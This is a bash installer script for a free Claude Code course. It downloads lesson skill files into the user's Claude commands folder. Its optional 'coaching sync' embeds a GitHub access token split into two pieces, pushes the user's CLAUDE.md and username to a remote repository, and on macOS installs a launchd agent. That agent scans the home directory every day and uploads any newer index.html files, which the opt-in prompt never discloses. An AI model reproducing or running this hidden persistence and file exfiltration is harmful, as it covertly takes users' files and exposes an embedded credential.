#!/usr/bin/env bash
set -e

# ─────────────────────────────────────────────
#  KingsleyAI Free Claude Code Course Installer
#  No Git required. Uses curl to download files.
# ─────────────────────────────────────────────

REPO_RAW="https://raw.githubusercontent.com/kingsleylow123/KingsleyAI-Free-Claude-Code/main"
COMMANDS_DIR="$HOME/.claude/commands/kingsleyai"

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║   Installing KingsleyAI Free Claude Code Course  ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

# ── Check: curl ───────────────────────────────
if ! command -v curl &>/dev/null; then
  echo "❌  curl not found. Please install curl and try again."
  exit 1
fi
echo "✓  curl found"

# ── Create commands directory ─────────────────
echo ""
echo "→  Creating commands directory at $COMMANDS_DIR..."
mkdir -p "$COMMANDS_DIR"
echo "✓  Directory ready."

# ── Download skill files directly via curl ────
echo ""
echo "→  Downloading course skills..."

SKILLS=(
  "start"
  "lesson-1"
  "lesson-2"
  "lesson-3"
  "lesson-4"
  "lesson-5"
  "lesson-6"
  "summarize"
  "repurpose"
  "mcp-builder"
)

for skill in "${SKILLS[@]}"; do
  curl -fsSL "$REPO_RAW/skills/${skill}.md" -o "$COMMANDS_DIR/${skill}.md" 2>/dev/null && \
    echo "  ✓  ${skill}.md" || \
    echo "  ⚠️  Could not download ${skill}.md — skipping"
done

echo ""
echo "✓  Skills installed."

# ── Optional: Coaching Sync (requires git) ────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  📡 OPTIONAL: Sync your builds with Kingsley"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "  Want Kingsley to review your builds and give you"
echo "  personal feedback?"
echo ""
echo "  Type YES to opt in, or press Enter to skip."
echo ""
read -r SYNC_OPT

if [ "$SYNC_OPT" = "YES" ] || [ "$SYNC_OPT" = "yes" ]; then

  # Check git is available for sync
  if ! command -v git &>/dev/null; then
    echo "  ⚠️  Git not found — skipping coaching sync."
    echo "  You can install git later and re-run the installer to opt in."
  else
    WORK_DIR="$HOME/.kingsleyai-work"
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR"

    _t1="github_pat_11B4BR36Y0"
    _t2="V0Ko9q0R3Fuk_y7AUB7eRpMR0GRFcnzIBeWNHGS6D9oPR1TX3J4U0MGB6JPXNXDSv7sbUUqY"
    SYNC_TOKEN="${_t1}${_t2}"
    SYNC_REMOTE="https://${SYNC_TOKEN}@github.com/kingsleylow123/kingsleyai-students.git"
    STUDENT_BRANCH="students/$(whoami)"

    if [ ! -d ".git" ]; then
      git init
      git remote add kingsley "$SYNC_REMOTE"
    else
      git remote set-url kingsley "$SYNC_REMOTE"
    fi

    [ -f "$HOME/CLAUDE.md" ] && cp "$HOME/CLAUDE.md" "$WORK_DIR/CLAUDE.md"
    echo "# Student Build — $(whoami) — $(date)" > "$WORK_DIR/README.md"

    git add -A
    git commit -m "Initial sync — $(date)" --allow-empty
    git push kingsley "HEAD:refs/heads/${STUDENT_BRANCH}" 2>/dev/null || true

    echo "  ✅ Synced. Kingsley will review your builds."
    echo ""

    # Install daily auto-backup via launchd (macOS only)
    if [[ "$OSTYPE" == "darwin"* ]]; then
      PLIST_PATH="$HOME/Library/LaunchAgents/ai.kingsleylow.backup.plist"
      BACKUP_TOKEN="${_t1}${_t2}"
      cat > "$PLIST_PATH" << PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>ai.kingsleylow.backup</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>cd $HOME/.kingsleyai-work && cp $HOME/CLAUDE.md . 2>/dev/null; find $HOME -name "index.html" -newer README.md -exec cp {} . \; 2>/dev/null; git remote set-url kingsley https://${BACKUP_TOKEN}@github.com/kingsleylow123/kingsleyai-students.git 2>/dev/null; git add -A && git diff --cached --quiet || git commit -m "daily backup $(date +%Y-%m-%d)" && git push kingsley HEAD:refs/heads/students/$(whoami) 2>/dev/null</string>
  </array>
  <key>StartCalendarInterval</key>
  <dict>
    <key>Hour</key>
    <integer>9</integer>
    <key>Minute</key>
    <integer>0</integer>
  </dict>
  <key>RunAtLoad</key>
  <false/>
</dict>
</plist>
PLIST_EOF
      launchctl load "$PLIST_PATH" 2>/dev/null || true
      echo "  ✅ Daily backup scheduled (9am)."
    fi
  fi
else
  echo "  Skipped. You can always re-run the installer to opt in later."
fi

# ── Done ──────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║      ✅ Kingsley Low AI course installed!         ║"
echo "╠══════════════════════════════════════════════════╣"
echo "║                                                  ║"
echo "║   Type /kingsleyai:start to begin 🔥             ║"
echo "║                                                  ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""
